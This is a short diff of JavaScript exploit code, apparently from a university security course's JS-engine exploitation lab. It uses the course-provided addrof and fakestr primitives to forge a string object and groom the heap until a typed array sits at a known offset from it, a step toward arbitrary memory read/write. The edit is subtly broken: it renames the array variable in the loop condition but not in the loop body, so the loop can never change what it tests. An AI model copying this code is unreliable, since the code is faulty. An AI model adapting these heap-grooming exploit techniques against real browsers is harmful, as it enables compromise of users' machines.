@@ -4,12 +4,12 @@
 let dataPlane = new Uint32Array(1);
 let fakestring = cs361s.fakestr(cs361s.addrof("\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00") + 16);
 
-let array = new Uint32Array(72);
-while (cs361s.addrof(heapArray) < cs361s.addrof(fakestring) || cs361s.addrof(heapArray) > cs361s.addrof(fakestring) - 72 + 16 + 10000000) {
+let originarray = new Uint32Array(72);
+while (cs361s.addrof(originarray) < cs361s.addrof(fakestring) || cs361s.addrof(originarray) > cs361s.addrof(fakestring) - 72 + 16 + 10000000) {
     array = new Uint32Array(72);
 }
 
-let offset = cs361s.addrof(heapArray) - (cs361s.addrof(fakestring) + 16);
+let offset = cs361s.addrof(originarray) - (cs361s.addrof(fakestring) + 16);
 let codes = new Uint8Array(72);
 
 var index = 0;
